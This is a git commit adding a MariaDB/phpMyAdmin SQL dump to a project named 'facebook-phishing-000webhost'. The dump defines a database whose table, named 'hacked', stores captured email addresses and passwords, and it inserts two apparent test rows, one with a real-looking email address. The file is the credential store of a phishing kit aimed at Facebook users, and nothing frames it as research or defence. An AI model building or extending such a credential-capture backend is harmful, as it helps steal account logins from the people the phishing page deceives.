bc8edd5d36d279e0e528c16c0a3276902a7957f0
Ahmed Saber <64714761+ahmed0saber@users.noreply.github.com>
2021-10-13 05:20:07 +0200

    Add files via upload

---
+++ facebook-phishing-000webhost/id17754443_phishing.sql
@@ -0,0 +1,47 @@
+-- phpMyAdmin SQL Dump
+-- version 4.9.5
+-- https://www.phpmyadmin.net/
+--
+-- Host: localhost:3306
+-- Generation Time: Oct 13, 2021 at 03:19 AM
+-- Server version: 10.3.16-MariaDB
+-- PHP Version: 7.3.23
+
+SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
+SET AUTOCOMMIT = 0;
+START TRANSACTION;
+SET time_zone = "+00:00";
+
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8mb4 */;
+
+--
+-- Database: `id17754443_phishing`
+--
+
+-- --------------------------------------------------------
+
+--
+-- Table structure for table `hacked`
+--
+
+CREATE TABLE `hacked` (
+  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
+  `password` varchar(255) COLLATE utf8_unicode_ci NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
+
+--
+-- Dumping data for table `hacked`
+--
+
+INSERT INTO `hacked` (`email`, `password`) VALUES
+('test', 'test'),
+('ahmed0saber@gmail.com', 'aaaaa');
+COMMIT;
+
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
